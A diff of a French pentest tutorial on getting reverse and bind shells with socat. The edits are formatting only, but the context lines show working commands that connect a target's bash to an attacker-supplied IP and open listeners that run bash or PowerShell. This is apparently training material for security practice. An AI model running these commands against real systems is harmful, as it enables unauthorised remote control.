@@ -1,7 +1,7 @@
 
 ## __Reverse shell__
 
-https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat 
+[Binaire précompilé de socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) 
 Pour setup un reverse shell avec socat c'est légèrement plus compliqué qu'avec netcat.
 
 #### 1- Listener -- Notre machine
@@ -35,13 +35,13 @@ user@raspberrypi: ~$ socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:"bash -li"
 
 #### 1- Listener -- Machine cible
 
-1) Sur la machine cible sous linux :
+1) Sur la machine cible sous **Linux** :
 
 ```shell
 user@raspberrypi: ~$ socat TCP-L:<TARGET-PORT> EXEC:"bash -li"
 ```
 
-2) Sur une machine Windows
+2) Sur une machine **Windows**
 
 ```shell
 PS C:\Users\user> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
